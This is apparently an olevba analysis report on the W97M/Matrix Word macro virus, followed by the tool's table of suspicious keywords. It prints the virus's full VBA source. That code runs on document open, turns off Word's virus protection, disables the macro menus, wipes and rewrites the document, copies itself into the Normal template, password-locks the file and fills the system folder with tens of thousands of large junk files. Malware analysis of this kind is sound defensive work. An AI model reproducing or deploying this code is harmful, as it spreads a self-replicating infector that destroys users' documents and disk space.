olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Matrix-4192b2391c6af07e15135a1bf2e06ffe42f3cfaa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Matrix-4192b2391c6af07e15135a1bf2e06ffe42f3cfaa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    On Error Resume Next
    Dim b, mfm, fn, mi, ma, cfn
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "MVP") <> "Enabled by Total Konfuzion" Then
        With Options
            .VirusProtection = (Rnd * 0)
            .SaveNormalPrompt = (Rnd * 0)
            .ConfirmConversions = (Rnd * 0)
            .SavePropertiesPrompt = (Rnd * 0)
            .BlueScreen = (Rnd * 0) + 1
        End With
        CommandBars("Tools").Controls("Macro").Enabled = (Rnd * 0)
        CommandBars("Tools").Controls("Templates and Add-ins...").Enabled = (Rnd * 0)
        CommandBars("Format").Controls("Style Gallery...").Enabled = (Rnd * 0)
        With Application
            .Caption = "Micro$oft Matrix"
            .UserName = "Total Konfuzion"
            .UserInitials = "TK"
            .UserAddress = "W97M/Matrix" & vbCr & "The Matrix has you."
        End With
        With Selection
            .HomeKey Unit:=wdStory
            .EndKey Unit:=wdStory, Extend:=wdExtend
            .Delete Unit:=wdCharacter, Count:=1
            .ParagraphFormat.Alignment = wdAlignParagraphCenter
            .Font.Name = "Arial"
            .Font.Bold = (Rnd * 0) + 1
            .Font.Size = 20
            .Font.Animation = wdAnimationShimmer
            .TypeText Text:="The Matrix has you."
            For b = 1 To 7
                .TypeParagraph
            Next b
            .Font.Bold = (Rnd * 0)
            .Font.Italic = (Rnd * 0) + 1
            .Font.Size = 8
            .Font.Animation = wdAnimationNone
            .TypeText Text:="Follow the white rabbit."
            .Font.Italic = (Rnd * 0)
            For b = 1 To 3
                .TypeParagraph
            Next b
            .Font.Bold = (Rnd * 0) + 1
            .TypeText Text:="()...()"
            .TypeParagraph
            .TypeText Text:="( ' = ' )"
            .TypeParagraph
            .TypeText Text:="(''')(''')"
        End With
        Selection.HomeKey Unit:=wdStory
        If ThisDocument = ActiveDocument Then Set i = NormalTemplate Else Set i = ActiveDocument
        Vx = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
        Set d = i.VBProject.VBComponents.Item(1).CodeModule
        d.DeleteLines 1, d.CountOfLines
        d.AddFromString Vx
        With ActiveDocument
            .ReadOnlyRecommended = (Rnd * 0) + 1
            .Password = "ashley"
            .WritePassword = "ashley"
        End If
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
        mfn = (Rnd * 0)
        fn = FreeFile
        For mi = 1 To 50000
            mfn = mfn + 1
            Open "C:\Windows\System\Matrix" & mfn & ".sys" For Output As #fn
                For ma = 1 To 100000
                    Print #fn, "The Matrix has you."
                Next ma
            Close #fn
        Next mi
    End If
' W97M/Matrix
'   by: Total Konfuzion
' Are YOU looking for it !!?
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

